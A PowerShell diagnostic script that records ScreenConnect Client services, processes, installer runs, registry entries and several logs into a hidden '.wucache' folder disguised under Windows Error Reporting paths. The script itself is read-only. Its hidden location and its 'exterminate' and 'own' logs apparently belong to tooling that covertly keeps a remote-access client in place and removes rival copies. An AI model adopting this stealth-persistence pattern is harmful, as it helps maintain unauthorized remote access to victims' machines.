# DIAG snapshot for Gryxa reinstall loop — writes .wucache\diag.txt
$o = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\diag.txt'
"=== DIAG $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ===" | Out-File $o
'--- SC services ---' | Out-File $o -Append
Get-CimInstance Win32_Service -Filter "Name like 'ScreenConnect Client%'" |
    ForEach-Object { "$($_.Name) | $($_.State) | pid $($_.ProcessId) | $($_.PathName)" } |
    Out-File $o -Append
'--- SC processes (null path = the killer) ---' | Out-File $o -Append
Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" |
    ForEach-Object { "$($_.ProcessId) | $($_.Name) | exe=$($_.ExecutablePath) | cmd=$($_.CommandLine)" } |
    Out-File $o -Append
'--- msiexec running ---' | Out-File $o -Append
Get-CimInstance Win32_Process -Filter "Name='msiexec.exe'" |
    ForEach-Object { "$($_.ProcessId) | $($_.CommandLine)" } | Out-File $o -Append
'--- recent procs (spawn order) ---' | Out-File $o -Append
Get-CimInstance Win32_Process |
    Where-Object { $_.Name -match 'msiexec|ScreenConnect|powershell|schtasks|wmiprvse' } |
    Sort-Object CreationDate | Select-Object -Last 40 |
    ForEach-Object { "$($_.CreationDate.ToString('HH:mm:ss')) | pid $($_.ProcessId) | ppid $($_.ParentProcessId) | $($_.Name)" } |
    Out-File $o -Append
'--- ARP registered SC ---' | Out-File $o -Append
foreach ($r in @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
                 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')) {
    Get-ChildItem $r -EA SilentlyContinue |
        Where-Object { (Get-ItemProperty $_.PSPath -EA SilentlyContinue).DisplayName -match 'ScreenConnect Client' } |
        ForEach-Object { "$r | $($_.PSChildName) | $((Get-ItemProperty $_.PSPath).DisplayName)" } |
        Out-File $o -Append
}
'--- SC dirs ---' | Out-File $o -Append
Get-ChildItem 'C:\Program Files (x86)\ScreenConnect Client*', 'C:\Program Files\ScreenConnect Client*' -Directory -EA SilentlyContinue |
    ForEach-Object { $_.FullName } | Out-File $o -Append
'--- own files ---' | Out-File $o -Append
Get-ChildItem 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache' -EA SilentlyContinue |
    ForEach-Object { "$($_.Name) | $($_.Length) | $($_.LastWriteTime.ToString('HH:mm:ss'))" } | Out-File $o -Append
'--- gryxa.cfg ---' | Out-File $o -Append
if (Test-Path 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\gryxa.cfg') {
    Get-Content 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\gryxa.cfg' | Out-File $o -Append
}
'--- mon.log tail ---' | Out-File $o -Append
Get-Content 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_mon.log' -EA SilentlyContinue |
    Select-Object -Last 60 | Out-File $o -Append
'--- exterminate.log tail ---' | Out-File $o -Append
Get-Content 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\exterminate.log' -EA SilentlyContinue |
    Select-Object -Last 30 | Out-File $o -Append
'--- gryxa_ensure.log tail ---' | Out-File $o -Append
Get-Content 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\gryxa_ensure.log' -EA SilentlyContinue |
    Select-Object -Last 30 | Out-File $o -Append
'DONE'
